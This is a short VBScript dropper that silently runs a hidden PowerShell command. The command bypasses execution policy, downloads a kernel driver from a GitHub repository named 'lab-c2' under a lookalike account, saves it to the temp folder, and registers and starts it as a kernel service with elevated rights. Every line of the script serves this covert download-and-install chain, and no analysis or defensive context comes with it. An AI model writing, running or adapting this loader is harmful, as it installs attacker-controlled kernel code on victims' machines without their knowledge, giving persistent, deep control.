Set objShell = CreateObject("WScript.Shell")
' This command downloads the driver and registers it as a kernel service silently
command = "powershell -NoP -ExecutionPolicy Bypass -W Hidden -C ""$d='$env:TEMP\se64a.sys'; iwr 'https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/se64a.sys' -OutFile $d; Start-Process cmd -ArgumentList '/c sc create se64a binPath= $d type= kernel && sc start se64a' -WindowStyle Hidden -Verb RunAs"""
objShell.Run command, 0, False